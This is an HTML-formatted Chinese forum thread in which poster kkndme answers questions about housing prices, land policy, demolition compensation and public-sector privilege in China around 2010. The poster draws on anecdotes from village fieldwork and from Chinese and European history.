<p>只有努力工作赚钱才是唯一能抵抗通胀的办法，这也是zf最希望看到的。</p>
<p>当然体制内员工，工资制度本身就可以抵御通胀。这些多发出来的钱是需要体制外广大群众创造出来的，他们本身并不创造价值。</p>
<p>而体制外的广大群众要想抵御通胀，就必须努力工作，创造更大的价值来提高收入水平。</p>
<p>这也就是国家能够维持运转的根源所在啊</p>
</blockquote>
<blockquote>
<p><strong>feifeilongdi:</strong></p>
<p>请问楼主国家的收入分配改革调整的是哪一部分人的收入？</p>
<p>我们底层p民如果真的连公租房都只能勉强供得起，那以后子女的抚养费用，夫妻以后的养老资金如何解决</p>
<p><strong>kkndme：</strong></p>
<p>工资收入分配改革应该只是个说法，对公有制经济是很有实惠的。但非公有制员工的工资是阳光雨露都撒不到的。</p>
<p>以前说涨工资基本都是公务员，收入分配改革后可能对事业单位及国企工资收入有明显改善。</p>
<p>至于体制外，无论打工仔和个体户都是自生自灭的</p>
</blockquote>
<h2 id="体制外人员养老确实是个问题"><a href="#体制外人员养老确实是个问题" class="headerlink" title="体制外人员养老确实是个问题"></a>体制外人员养老确实是个问题</h2><p>做生意的赚钱养老<br>聪明的下手早的以房养老<br>最惨的是没有混上去，且又没有特殊技能的私企打工仔。养老实在是个大问题。<br>所以东部地区才有宁挣老板1000元，不赚打工5000块的说法。<br>双轨制下，低层群众想翻身确实比较难。</p>
<h2 id="懂政策的重要性"><a href="#懂政策的重要性" class="headerlink" title="懂政策的重要性"></a>懂政策的重要性</h2><p>刚从深山老林钻出来，终于找到地方洗澡了，我激动啊。</p>
<p>洗完澡轻松，讲一个刚从支书那里听来的故事。</p>
<p>大家普遍感觉很穷的贵州省榕江县栽麻乡宰荡村，在解放前却是有名的富裕村，他们靠勤劳开垦荒地，良田多到种不过来，直到土改后，zf将宰荡的良田分给了加所、林所等周围几个土地较少的村子的村民（这些村子土地少的原因主要还是周围几个村子的村民比较懒惰，宁肯受穷也不愿意开垦荒地），宰荡才穷下来。</p>
<p>因为宰荡村过去比较富裕，拨给的富农指标就比较多。有一户人家很富裕，按理应该划为富农，但这户人家很了解政策，知道评上富农就会挨整，于是走关系，成分改成了中农。</p>
<p>而其他大多数依靠勤劳致富的人家非常老实，也不懂评为富农有什么不好，认为什么成分都无所谓，还不是老老实实干活。结果可想而知。当上了富农接下来就是没完没了的批斗。</p>
<p>这个故事告诉我们，哪怕当个农民也必须了解zf的意图。</p>
<h2 id="存钱不如存房子、存木头、存树"><a href="#存钱不如存房子、存木头、存树" class="headerlink" title="存钱不如存房子、存木头、存树"></a>存钱不如存房子、存木头、存树</h2><p>去年在宰荡做了一段时间的田野调查，今年这次来算是回访。时过一年，发现去年村子附近的大多数农田，今年都变成了房子。</p>
<p>现在农民政策还是可以的，即使贫困如贵州山区，农民除了能够完全自给自足外，多余的粮食蔬菜也能换来一定的经济收入，随着家境变好了，对更大的房子的需求也就产生了，农民愿意把闲钱都用来盖成更大的房子，宁肯牺牲掉自有耕地。这其实是一件可怕的事情。</p>
<p>这次同样对村民做了入户调查，发现了一件有意思的事情。</p>
<p>村民最感到遗憾的事情就是早在2000年初，那时村里还没有电，村民为了想让全村通电，卖掉了所有山上的古树。电通了，当时的村民很高兴，而且认为古树卖了一个高价格（当时总共卖了6万块钱），换来了全村的生活方便。</p>
<p>大约在三年后，其他村寨，zf都给免费通了电。如果那些古树不卖掉，现在随便一颗的价格都超过了6万。现在那些古树至少值几百万。</p>
<p>村民们用最朴实无华的思想总结了一个道理：存钱不如存房子、存木头、存树</p>
<h2 id="政府不考虑民生"><a href="#政府不考虑民生" class="headerlink" title="政府不考虑民生"></a>政府不考虑民生</h2><p>全国人民都知道有个以雷厉风行著称的球书记</p>
<p>球书记曾说过一段著名的话，大意是：昆明的开发商拿地价格很低，卖的价格却很高，腐败才是高房价根源。</p>
<p>当时昆明的很多无房户都很鸡冻，以为这下可好了，找到问题根源了，昆明房价要降了。</p>
<p>可是我听到的意思却是：zf卖地卖得太低了，应该大幅提高土地价格。</p>
<p>果然不久就出台了54321政策，以前拿地没走招拍挂程序的，一律按照54321补交土地款，否则开发商不发放任何证件，以至于升级到已买了房的业主也拿不到房产证。</p>
<p>于是昆明的新盘由于手续问题都无法开盘，已经卖掉很久的老盘，开发商还要求业主补交房款，否则退房。</p>
<p>结果可想而知，昆明的房价以一环与二环之间为例，由去年下半年的6000多涨到现在的均价过万。</p>
<p>如果从民生着想，会做出这样荒唐的事来吗。</p>
<h2 id="再谈买房时机"><a href="#再谈买房时机" class="headerlink" title="再谈买房时机"></a>再谈买房时机</h2><p>帖子里有朋友问昆明的买房时机，我只能说越早买越好，因为dfzf想钱已经想疯了</p>
<h2 id="利益才是zf行为的指挥棒"><a href="#利益才是zf行为的指挥棒" class="headerlink" title="利益才是zf行为的指挥棒"></a>利益才是zf行为的指挥棒</h2><p>北大朱晓阳用了十多年时间跟踪昆明城中村，对刚刚建好5年的宏仁村就要因为商业利益而拆迁已经出离了愤怒，结果这事捅到CCAV曝光了，拆迁的事只好暂停。</p>
<p>利益才是zf行为的指挥棒</p>
<h2 id="买房应该关注什么？"><a href="#买房应该关注什么？" class="headerlink" title="买房应该关注什么？"></a>买房应该关注什么？</h2><p>说到买房子，无论投资还是自住，最重要的还是稀缺性，首选还是学区房。</p>
<p>自住最好买政府公务员小区，无论是商业配套，教育配套以及休闲娱乐配套都是商品房所无法比拟的。特别是商品房经过十几二十年，房子旧了，电梯很容易出故障，如果物业有问题或者小区里有人不交物业费，那么这个小区就很难住了。</p>
<p>公务员小区则完全不用考虑房子老旧的问题，那都是zf包干到底的。</p>
<blockquote>
<p><strong>usstcai：</strong></p>
<p>怎么找这种房源呢？</p>
<p><strong>kkndme:</strong></p>
<p>每个城市的情况不一样，北京基本上是单位的老公房，老计委的房，中石化的房都有上市交易的，但新房很难找。</p>
<p>至于二三线城市，现在还存在大量的公务员、垄断企业的新小区，并且很多房源都在市场上交易。比如昆明，存在大量的权贵小区，比如金江小区是省政府公务员小区，月牙塘小区是市政府公务员小区。</p>
</blockquote>
<h2 id="流氓无产者"><a href="#流氓无产者" class="headerlink" title="流氓无产者"></a>流氓无产者</h2><p>关于流氓无产者，在宰荡村子里还听了个故事</p>
<p>说很久以前的事情。</p>
<p>宰荡村民都很勤劳很淳朴。但是意外的出了一个叫罗老黑的人。</p>
<p>这个人好吃懒做无所事事，看见人家地里庄稼蔬菜长的好就跑去抢，为此挨过几次打。有一天罗老黑路上遇到个大兵，骗了大兵的枪，于是开始在村子里耀武扬威，不但抢人家辛辛苦苦种的菜，遇到单身的姑娘还动手动脚。</p>
<p>罗老黑在村里到处宣传他的逻辑：村里的庄稼、蔬菜、猪牛应该见者有份。</p>
<p>村里一些年轻人受了罗老黑的感染，开始变得好吃懒做，谁家种的东西都跑去拿。于是，村里人都不愿意劳动了，宰荡村开始变穷。</p>
<p>村里有个人很憎恨罗老黑的行为，但不敢明着跟王老黑作对，就在晚上在王老黑家放了一把火。侗族人住的房子都是杉木的，一旦一家着火，很可能全村遭殃，那把火烧了整个宰荡寨子，连青石板都烧裂了。</p>
<p>罗老黑，这个典型的流氓无产者，他的光荣事迹被当作反面教材激励着世世代代的宰荡村民。</p>
<blockquote>
<p><strong>zhuce010022:</strong></p>
<p>不合理的制度不会永远的存在下去的。。。正如国父当年说的一句“天下大势浩浩荡荡，顺之者昌，逆之者亡”。。。现在的高房价是目前中国的政治、经济结构失序造成的。楼主上面分析了那么多，确实是，在目前这种局面下可能一直冲到崩是唯一的选择，但是，你怎么知道这种失序的大局面会一直持续下去呢？</p>
<p><strong>kkndme:</strong></p>
<p>一个朝代从鼎盛到衰亡至少维持个一两百年。所谓天下大势分久必合，合久必分，由合到分，总还是有个时间跨度的。<br>侥幸能在有生之年平平安安就是最大的福气，身死之后，哪管洪水滔天</p>
</blockquote>
<blockquote>
<p><strong>错误角色:</strong></p>
<p>其实个人觉得普通炒房者不一定就能获多少利</p>
<p>比如他买一套新房是三千每平，等新房价到六千时出手，他能卖到五千每平。</p>
<p>看上去他每平赚了二千…但是，他要继续炒的话，就要再加每平一千的本金进去买新房…看上去他们是资产翻翻了，但是他们的二次投资也是翻翻的…也就是说他以前三十万买了一百平，现在卖出去是五十万，看上去赚了二十万，但是，他想再买个一百平的却需要六十万…</p>
<p>他还得从老本掏十万买同样大小的房子…这样算我也不知道对不对…要是对的话，就说明炒房的人不是抬高房价的最根本原因和最关键因素</p>
<p><strong>kkndme：</strong></p>
<p>你没考虑金融杠杆的作用</p>
<p>真正的投机炒房是贷款炒房，而投资客更愿意一次性付清。</p>
<p>一个炒房客用20万可以买100万的房子，等到200万卖掉，投入20多万，赚了170多万。</p>
<p>然后用变现的钱又可以贷款买多套，这就是投机炒房比股市更吸引人的地方，但是一旦资金链断掉就会比较惨。</p>
<p>这种赌徒心态的投机炒客还是比较遭人恨的，这次调控提高首付比例，对这类投机炒家打击不小。小资金的纯粹投机客数量控制在一个比较小的范围内，房产市场才会健康发展，这个国家是有共识的。所以二套房首付比例提高后，有可能变成常态</p>
</blockquote>
<h2 id="政府调控的目的与启示"><a href="#政府调控的目的与启示" class="headerlink" title="政府调控的目的与启示"></a>政府调控的目的与启示</h2><p>目前传言与辟谣越来越频繁，如何透过重重的迷雾看到事情背后的真相。</p>
<p>这次调控zy盯的主要还是一线城市，从提高首付比例，直到监管预售款的准备推出，都是为了提高房地产进入门槛，踢出大量小资金投资客，让小开发商民营开发商知难而退，为国家队入场铺路</p>
<p>zy需要稳定一线城市房价，使2012年能够顺利换届，为换届后的上涨留足空间。</p>
<p>有了国家队的后盾，zy无需因为调控导致部分小开发商资金链断掉而担心，相反这是zy希望看到的。</p>
<p>当然在政策和市场的博弈中，是否能够达到zy的预期，zy的心理也不一定完全有底，因为资金有他自己内在的规律。在打压房地产的同时，会带来农产品等生活必须品的价格全面上涨，这就需要xy做出一个权衡。因为填饱肚子的问题比房价的问题更重要。</p>
<p>多数二三线城市会在一线城市滞涨期间进行补涨，补足09年行情中远低于一线城市的涨幅。</p>
<p>作为二三线城市的刚需买房者，多数城市的情况都是早买胜于晚买</p>
<h2 id="个人的智慧和才干决定了个人的命运"><a href="#个人的智慧和才干决定了个人的命运" class="headerlink" title="个人的智慧和才干决定了个人的命运"></a>个人的智慧和才干决定了个人的命运</h2><p>领导人的智慧和才干决定了国家的命运，统帅的智慧和才干决定了军队的命运，而个人的智慧和才干决定了个人的命运。</p>
<p>精英社会相对于法制社会存在更多的不稳定性，更崇尚个人能力、才干与职业精神，如果刘备只懂得眼泪是不可能得到三分天下的。</p>
<p>精英社会的根本就是以人治国，就是要承认人与人之间的差别。</p>
<p>百年战争，法国拥有全世界最强大的重骑士军团，可是由于统帅的无能，被英国长弓兵打得落花流水。</p>
<p>而耶路撒冷王国的鲍德温四世，一个年轻的麻风病人，率领几百个骑士打得萨拉丁三万马木流克骑兵溃不成军，几乎全军覆没。</p>
<p>一个人很可能决定一个国家的命运。</p>
<p>聪明智慧决定了人的眼界，有远见的人一定会未雨绸缪。</p>
<p>刘邦身为区区亭长可以得天下，朱元璋一个穷和尚驱除鞑虏重建朝廷，一个司机未尝不能当富商，一个小姐也可能当局长</p>
<h2 id="金钱至上"><a href="#金钱至上" class="headerlink" title="金钱至上"></a>金钱至上</h2><p>也许任何一个国家，甚至中国历史上任何一个朝代都没有象现在那样金权至上。</p>
<p>无论中国的儒家思想还是西方的骑士精神，都告诉人们，人总是要有所追求的，不能仅仅盯着钱。</p>
<p>秦时，有个老头叫郦食其，70多岁了还跑到刘邦大营参与革命，当然最后下场比较凄惨，被齐王煮了。郦老头本事很大，只身到齐国说服齐王归降了汉王刘邦。</p>
<p>韩信害怕郦老头功劳太高，超过自己，于是很不仗义，在郦老头人还在齐国的时候，带兵攻打了齐国。齐王很愤怒，后果很严重，把郦老头放在锅里煮了。郦老头的才能出众，本想做一番事业，可惜没有算到人类本性丑恶的一面。</p>
<p>当然韩信也没有好下场，这个军事上的天才，政治上的白痴，本来做了齐王，汉、楚、齐三足鼎立，结果向刘邦缴了枪，直接兔死狗烹了。</p>
<p>另一个喜欢没事找事的老头叫姚广孝，是个和尚，法号道衍。</p>
<p>虽是和尚，但既无和尚的慈悲心肠，又无和尚的遁世清修，这个老头专门搞权谋，不玩阳谋专玩阴谋，背靠朱棣这颗大树，不图名不图利，专搞武装夺取政权。</p>
<p>姚老头的头脑比郦老头高得多，不但是牛叉的阴谋家，也是牛叉的政治家，此人协助朱棣夺权后，深味帝王权术的精髓。</p>
<p>不立家室，不营产业，把一脑袋阴谋全都转向文化事业，跟大才子解缙纂修《永乐大典》，是为数不多投身权谋得了好死的大师级人物</p>
<h2 id="供求关系"><a href="#供求关系" class="headerlink" title="供求关系"></a>供求关系</h2><p>关于供求关系还是有必要解释一下的</p>
<p>一提起供求关系，马上口水就来了，什么空置率啦，闲置率啦，空置我心啦，电表显示6000万套房没人住啦。</p>
<p>实际上供求关系跟空置率和闲置率完全没有关系。</p>
<p>对于具备投资属性的商品，供求关系是指货币与商品之间的关系。当货币量大于商品供应量时，商品价格就会上涨，即使人为打压也是短期行为，这是铁律。</p>
<blockquote>
<p><strong>fantabulouski:</strong></p>
<p>楼主给点意见吧，想在上海市内环内买套二手房，现在出手合适嘛？等等的话可能跌点么？有没有什么风险吗？多谢！ 因为首套房可以贷款七成，多谢！！</p>
<p><strong>kkndme:</strong></p>
<p>如果手头有钱，又是自住，到不一定非要考虑抄在最底部。</p>
<p>因为钱要贬值是毋庸置疑的，房价在一段较长时期上涨的趋势也是毋庸置疑的。</p>
<p>但短期，波段性的抄底和逃顶是很难把握的，尤其是自住，考虑太多实在没有意义。</p>
<p>持币要冒房价持续上涨的风险，买房可能会面临短暂小幅下跌，哪个风险更大，需要自己认真考虑。</p>
<p>一线城市如上海一定会有短期的滞涨甚至小幅的下跌，当新房的价格低于周边二手房价，并且成交量开始逐渐攀升就是买房的时机。</p>
<p>我反复强调，这次调控期却是二三线城市的补涨期，对于一线城市正好可以仔细的挑选好房，这种机会在房价上升期是难以遇到的。</p>
<p><strong>fantabulouski:</strong></p>
<p>楼主再问一个问题，看看这一两天调控的信息满天飞，上海房产税的消息也到处都是，银行在不断的紧缩，感觉这次调控可是不同以往，是外松内紧啊，至少到年底前看不到放松的迹象，还什么情况下才可能会放松呢？难道要等到KQ 接班不成？</p>
<p><strong>kkndme:</strong></p>
<p>可以肯定的是首付款的比例是不会轻易放松的。房产税的推出就没那么容易了。</p>
<p>上海和北京城区的二手房价有点幅度的下跌几乎不可能，很长一段时间都会滞涨或者维持小幅度的上涨。手里资金多的人全款买房的比例大幅提高，精英阶层的购买力基本能够维持一线城市的正常的成交量（09年下半年的高成交量zy认为是反常的，已经影响了金融秩序，是zy不愿意看到的。）</p>
<p>现在的状况是，zy对调控后一线城市的房价增幅及成交量基本是满意的。</p>
</blockquote>
<blockquote>
<p><strong>黛眉轻：</strong></p>
<p>LZ厉害，分析得很透彻。</p>
<p>请教LZ，对于目前的合肥房价怎么看呢？</p>
<p>做为皖江城市带的中心城市，合肥的房价目前中心城区已经到了7000，也有了超过万元的所谓豪宅。和武汉长沙比起来，经济上感觉合肥还是差的，可是房价却已经不差了。</p>
<p><strong>kkndme：</strong></p>
<p>凡是大兴土木积极拆迁的城市，房价都低不了，城市发展规划的资金都要得益于dfzf卖地。</p>
<p>这是zf主导投资经济模式的必然结果。这也是二三线城市在这次调控中补涨的根本原因</p>
</blockquote>
<h2 id="拆迁补偿"><a href="#拆迁补偿" class="headerlink" title="拆迁补偿"></a>拆迁补偿</h2><blockquote>
<p><strong>welldayzwb：</strong></p>
<p>楼主我想请教一下：就是北京二三环甚至四环有不计其数的老式砖混板楼，年代分布从六七十年代到八十年代初的都有，这些房子都是北京城市发展的产物，也是北京留给土著们的天然福利。</p>
<p>但是现在有个问题是它们的房龄已经超过30年奔着40,50去了，这些房子的命运如何呢？拆迁吗？在原址上盖回迁房或者重新规划把里面的居民赶到周围郊区？</p>
<p>因为随着政策的收紧，这类房子越来越不容易流通了，银行不给贷款，升值空间也逐渐放缓，但是地段都非常好。是不是随着房龄的增加，这类房子只剩下保值功能而最终无法流通了呢？</p>
<p>这批房子最终会大规模寿终正寝，不知道dfzf会怎么处置？很想听听你的看法。</p>
<p><strong>kkndme：</strong></p>
<p>这个情况比较复杂，因为大多数老房子是各大部委的单位房。原则还是谁的孩子谁包干，谁的孩子谁认领。所以说买房子买到公务员小区最保险，即使房子旧了也不会没人管，也不会存在物业跑路、小区沦为贫民窟的问题，即使老房子拆了单位盖了高楼，保证会在原址上还你一套。</p>
<p>至于说单位不行了或者单位不存在了的老公房也是有的，早晚会走拆迁的路子，那就没有原址回迁那么幸运了，肯定是搬到远郊区县，但补偿条件肯定不差，离开城中心到郊区就成了富翁。</p>
<p>位置决定了价值。北京郊区农民房拆迁补偿两万一平就算高的，但是城中心房屋拆迁，补偿款那都是10万一平起步的。愿意一掷千金全款买城中心老房子的人只会多不会少，说白了就是：哥买的不是房子，是位置。</p>
</blockquote>
<blockquote>
<p><strong>汝爱之罪：</strong></p>
<p>北京七八十年代的砖混老房有体制内的，也有体制外的。现在公房上市流通，好多央产房也易主了，也许过个十年二十年的这批房子的产权证上早已换了一波又一波人。除非像楼主所说的昆明那种大型的省市公务员小区，房子新，户型好，环境和地理位置都不错，一般公务员没个20年轻易不会卖。</p>
<p>北京的这些老楼，不管谁是房主，肯定值钱，房子不值钱，位置还值钱呢。</p>
<p>至于这些房子使用寿命到了以后怎么处置，谁也说不清，能不能回迁，要看dfzf和规划局的利益。比如眼下金融街西侧月坛的老房子就要被集体拆除，连中学都要搬迁，这些西城人很有可能被撵到昌平回龙观西去，那边已经在建大批安置房了。</p>
<p>所以说，这些老房子不管是体制内的还是体制外的，命运如何不在自己手里。即使体制内的比较不错的老小区（比如三里河的建设部小区），如果牵涉到地方的利益，肯定也是毫不犹豫全部拆除，除非那里面住着实权人物当官的不让拆。这个时候就要看这些被拆迁户的谈判能力了，谈判能力强的，当个钉子户，当然是要得越多越好。</p>
<p>我以前买房的时候，也想了这些，不过最后还是买了新楼。现在因为地皮的价值，北京新老楼的房价差距不大，这个在别的城市是不可思议的。</p>
<p>很感谢楼主发这么一个帖子，版主还给了个绿脸，要不然可能就错过拜读的机会了</p>
<p>其实有些问题平时自己也在思考，比如GDP为什么保八，房价和滥发纸币等等，但是关于炒房和房租这一块，思考的并不多，而楼主的帖子比较有条理和逻辑的分析了这些方面，真的是很感谢，我甚至不用自己写分析，只要把楼主的帖子稍微整理，就是一篇很不错的分析资料了。</p>
<p>关于zf收紧口子，抬高小老百姓炒房门槛这一块，天涯房观有几个高人和楼主的看法一致。我细细想了一下，这个提高首付到50%的政策，确实会成为长期政策保持下去，而其实即使没有这个政策，稳健型的小老百姓也会掂量自己的钱袋买房。没有谁想断供，因为刚需需要房子。</p>
<p>至于以后十年甚至更长时间，房价仍然会涨。因为城市的发展离不开勤劳的人民，zf在不断的修建地铁画大饼，就是为了土地能卖个好价钱，只有不断的卖地搞铁公鸡，才会有gdp，才会有政绩。统治阶级带着他的各种利益集团一起玩，而老百姓以后可玩之物会越来越少，只能老老实实的干活挣钱。</p>
<p>由于家人的优柔寡断和缺乏对北京房地产现实的认识，我直到今年初才在四环买了第一套房，3w多的均价，让家里背负了100多w的债务。我错过了07年1w的机会，和09年1w+的机会。世上没有后悔药，历史也不会重演，那些07年买房和09年买房的人是幸运的。我现在努力攒钱挣钱的同时，最希望看到的事情居然是房价尽快远离我的成本区，我知道没有买房的同学一定会抨击我这种想法，但是现实就是这样可笑，一方面希望房价能降，这样可以把老人接到身边，另一方面又希望房价涨，这样自己在还贷的时候心里稍微能好受点。呵呵，不知道自己这样是不是活得太累。</p>
<p>不管怎么说，希望大家都能住上自己称心如意的房子，这几年来，zf真把我们这些人折腾的够呛。我和家人都是传说中的体制内，体制内确实有福利，可惜要想自己的财富不缩水，还得靠自己。</p>
</blockquote>
<p>关于拆迁补偿的事，巨大的利益驱使，那真是鲜血淋淋的。所以二手老房买在哪里很重要。银行的房、zf的房、各大部位的房，有上市交易的，买下来肯定不会吃亏。</p>
<p>存在风险的就是弱势群体聚居区。但是北京，毕竟天子脚下，不能搞得太僵，最终该补的还是会补到位，至于外省就很不好说了</p>
<h2 id="执政者如何治国"><a href="#执政者如何治国" class="headerlink" title="执政者如何治国"></a>执政者如何治国</h2><blockquote>
<p><strong>傻子也疯狂:</strong></p>
<p>今天看到新闻<br>什么房产市场回暖啊<br>温州炒房团又出江湖了<br>成交均价上涨啊</p>
<p>请问这个是真的吗，房价会在短时间涨上去吗<br>如果是真的，那中央调控有什么用，在没有下降的基础上再涨10%<br>不是自己打自己嘴巴吗</p>
<p>很想听听楼主怎么看待这个事情。</p>
<p><strong>kkndme:</strong></p>
<p>维持在正常成交量，保持一个缓步上涨的趋势，是zy最愿意看到的。因为zy很清楚，除非体制上有大动作，否则让房价下跌只是唱给人听的口号。体制是不能动摇的根本，是国家稳定的基础，高房价是体制造成的必然结果。zy很清楚，最好的方式就是以一个平缓的速度增长。但是决策者是不是有此能力控制房价缓慢上涨，这是值得仔细研究的。</p>
<p>任何一个朝代，即使是我们在电影里常看到的奸佞当权，往往政策的初衷都是好的，但是执行效果却常常适得其反，领袖的智慧与执政能力对国家的命运起着至关重要的作用。</p>
<p>明朝朱厚照时期有个太监刘瑾，权势一手遮天，是个典型的奸佞。但他其实是很想做点事情的。</p>
<p>明朝开国时，朱元璋搞了个戍边屯田，相当于现在的军垦，因为军队自给自足，给国家省了大笔的银子。但是到了后来，军官们都变成了大地主，霸占了士兵的土地，把士兵当作佃农，依靠盘剥士兵来实现让一部分人先富起来的号召。这是与杀良冒功、贪吃空饷并列齐名的第三大快速发家致富手段。</p>
<p>我们说了刘瑾是个有雄心壮志，很想做点事业的高责任心人士。对于军官霸占士兵田产导致士气低下这件事很看不惯，很不满意。决定坚决打击这种行为。于是下令地方zf</p>
<p>清理军官霸占田产的问题。</p>
<p>军官霸占的田产不仅仅是士兵的，更多的是当地老百姓的。</p>
<p>按理说，这应该是个老百姓叫好的政策，而事实上这是老百姓头上的噩梦。</p>
<p>执行人是谁？地方官。</p>
<p>地方官执行的时候就实在为难了，军官老爷手里都是握着重兵的，你上门还没开口，兵大爷的刀已经架在脖子上了。</p>
<p>可是刘瑾刘老板下达命令的同时，还是要下达任务指标的，没收的田产有任务指标，以前军官老爷占有的田都不交税，既然清理田产就要交税，交税也有任务指标。</p>
<p>有些地方官比较聪明，不敢找军官大爷收，就摊派给了老百姓，结果老百姓又交田又交税，自然是连活路都没了。</p>
<p>有些地方官脑子不清醒，真的跑去找军官老爷要田要税，结果造成军官勾结宁王造了反，最后刘瑾自己的脑袋也保不住了。</p>
<p>历朝历代，统治者代表的都是地主阶级的利益。历朝历代的改革都只是为了缓和底层群众与地主阶级的矛盾，防止因为过激发生极端群体性事件。</p>
<p>调控也是为了缓和矛盾，要温水煮青蛙，而不要一把火把青蛙烧死。</p>
<p>关于自己打自己嘴巴的事，那是太多了，自古以来，统治者也从来不怕自己打自己嘴巴。古人就总结过，只准州官放火，不准百姓点灯。</p>
<p>以前的科举制度与现在的公务员考试制度基本目的都是相同的，让全天下的优秀的和不优秀但有出身的知识分子依附于官，这样就有了绝对的话语权。</p>
<p>无法进入体制内的知识分子，有商业头脑和技术专长的人员，就相当于过去的商人、小作坊主，尽管也许还算富裕，但是没有任何地位，任人支配。</p>
<p>要是没有一技之长，又不能经商，就基本上在社会的最底层很难翻身，相当于过去城市里的贩夫走卒，甚至无片瓦立锥，糊口都是困难，地位和稳定性反而远远不如自给自足，拥有宅基地的农民。</p>
<p><strong>中年不惑吗：</strong></p>
<p>说到底空空太幼稚了，当年拖拉机之夜太学生怎么也想不到机关枪和拖拉机真的会招呼到自己身上，这和他们从小接受到的教育不一样呀。</p>
<p>主流宣传中party妈妈都是慈祥的温柔的全心全意为p民服务的</p>
<blockquote>
<p><strong>kkndme:</strong></p>
<p>这就是中西方的不同，西方的拖拉机是对外的，中国的拖拉机从来对的都是p民，对外基本比较忪。</p>
<p>所以才有元和清，明明是外族入侵灭了国，还要把蒙古人和女真人一起拉进来统一叫中华民族，居然认为中华民族很强大，元朝时一直打到亚得里亚海。也不管蒙古人跟中华的两河文明有关系没有。</p>
</blockquote>
<p>有皇帝大力支持的王安石变法到了地方法令也大变味，如今虎温的威权要远远小于当年的宋神宗和王安石，而且统治阶层从上到下的改革从来是为了巩固统治地位，至于p民收益那从来都是附属作用。</p>
</blockquote>
<blockquote>
<p><strong>汝爱之罪：</strong></p>
<p>其实，几千年来，唱的都是同样的戏，只不过台上的演员变换而已。</p>
<p><strong>kkndme：</strong></p>
<p>赞赏这一句，呵呵，历史规律是不变的，变化的只是时间、地点、人物、事件。</p>
<p>城头变换大王旗。</p>
<p><strong>tjOOSAN：</strong></p>
<p>历史规律是不变！但他妈世界变了！~~ 中国采用资本主义制度了</p>
<p>还只参考中国历史？</p>
<p><strong>kkndme：</strong></p>
<p>你知道什么叫资本主义制度吗？</p>
<p>首先基础是三权分立。</p>
<p>早在1748年，孟德斯鸠男爵发表了伟大的划时代的巨著“论法的精神”明确提出了三权分立。奠定了资本主义制度的基础。</p>
<p>三权分立制度就是国家的立法、行政、司法三权分别由三个机关独立行使，并相互制衡的制度。讲的是法律精神，讲得是私人财产神圣不可侵犯。</p>
<p>而作为一个人治而非法制国家，怎么能说是资本主义呢？</p>
<p>建议个别不读书，不研究，不了解中西方历史，不懂经济，对社会制度基本的理解基本是个白痴的同志，就不要乱发表议论了，惹人笑话。</p>
</blockquote>
<p>无论是中国还是西方历史对现在都是很有借鉴意义的。这就使毛说过的“古为今用，洋为中用”，毛建的武装斗争及建国思想其实很大程度来自于朱元璋。</p>
<p>古代君主统治国家征服世界靠战争武器，现在则靠金融武器。</p>
<p>西方，我们所熟悉的具备最纯正贵族血统的哈布斯堡家族，曾经的德意志王国和神圣罗马帝国的统治者，家族成员曾经统治过欧洲诸国：包括波希米亚王国 、匈牙利王国 、克罗地亚及斯洛文尼亚王国、伦巴第及威尼斯王国 、奥地利皇室领地 、萨尔茨堡公国 、塞尔维亚及塔米斯-巴纳特公国等等无数欧洲国家。</p>
<p>而现在，哈布斯堡家族控制着华尔街，继而通过华尔街控制着全球的经济。</p>
<p>历史是在继承的前提下发展的，特别是在西方，现在几乎每一个显赫的家族都能追根溯源。因为尽管西方也发生大革命，但是象文革一样彻底否定历史是完全不可思议的。</p>
<p>我们有点英雄情结的人听到最多的西方中世纪十字军三大骑士团：圣殿骑士团、条顿骑士图案、医院骑士团；直到现在仍有两大骑士团存在。</p>
<p>条顿骑士团总部现在还在德国，专门从事慈善事业。医院骑士团后来改名为马耳他骑士团，也就是现在的马耳他，世博会还来上海参展。只有圣殿骑士团灰飞烟灭，但现在仍有大量的修士组织自称为圣殿骑士团的继承人。</p>
<p>完全不懂历史，就等于完全不懂得社会。</p>
<blockquote>
<p><strong>肖肖19850706:</strong></p>
<p>楼主虽然有很多观点写的很有道理，但是对于历史这块，并不太正确</p>
<p>引用一段楼主的话：</p>
<blockquote>
<p><strong>kkndme:</strong></p>
<p>自古以来，民生问题的底线就是不要出现陈胜吴广的极端情况。所以zf更在意的是农民问题。<br>因为历史的改朝换代都是大饥荒引起的，无论是汉末、唐末、隋末、还是明末。农产品价格上涨的对zf的震动要远远大于房价的上涨。<br>农民具备最原始的力量，而他们关心的并不是三线以上城市的房价，而是能否填饱肚子。<br>而关心自己能否拥有一套产权房的都市白领，除了呻吟一下意外，几乎是没有什么有效反抗的可能的。</p>
</blockquote>
<p>其实在当今政权建立之前，还有一个政权，叫做中华民国<br>这个政权是由民主革命带来的<br>他们所举的旗帜是资产阶级革命，所建立的政权是资本主义社会<br>为什么会失败？<br>这是一个值得思考的问题<br>让一个经历了5000年封建社会的国家经过一次革命就达到资本主义社会的境界<br>没有工业革命的基础<br>没有原始的积累<br>有的只是借鉴西方<br>想先变制度再进行调整，结果固然是失败<br>于是“农民起义”卷土重来，我想大家肯定明白“农民”所指的是什么<br>于是又了现在的这个政权<br>由工人阶级和资产阶级去推翻帝制<br>再由农民阶级把土地抢回来，最终回到封建政权来压迫资产阶级<br>他们最怕的还是农民么？<br>显然不再是了<br>他们最怕的正是资产阶级<br>其次就是你说的那些<br>“关心自己能否拥有一套产权房，除了呻吟一下意外，几乎是没有什么有效反抗的可能的都市白领”<br>攻占巴士底狱的不是农民<br>正是这些“几乎没有什么有效反抗可能的都市白领”<br>是工人阶级结束了地球上长达上千年的封建统治<br>而改革开放，市场经济的发展，给了这一切充足的物质基础<br>社会的转化过程有两种<br>一种是和平演变<br>一种就是革命</p>
<p>现在所存在的问题，不是他们更怕谁<br>而是他们选择面对哪种演变方式</p>
<p><strong>kkndme:</strong></p>
<p>最可怕的不是农民而是失去土地的农民。</p>
<p>为什么说新民主主义革命是工人阶级领导的？</p>
<p>那时的工人阶级是什么？就是失去土地的农民和破产的手工业者，除了体力一无所有，所以他们才具备脑袋掖在裤腰带上，为了抢土地而玩命的动力。解放战争时期，我军的宣传就是：“同志们，国民党要把分给你们的土地抢走，你们说怎么办？”于是广大失去土地的农民兄弟不干了，玩命了。</p>
<p>工农红军一四方面军胜利会师，在选择南下和北上发生了分歧，真的为了北上抗日吗？1935年抗日战争还没有打响，日本人在东北而不是西北。北上抗日的说法实在有些牵强。</p>
<p>我想真正的原因还是群众基础。</p>
<p>近几年多次在西南地区的乡村进行田野调查，发现一个问题：解放前，即使如贵州山区的偏僻乡村，农民自给自足吃饱肚子是完全没有问题的，更别说富庶的四川平原。</p>
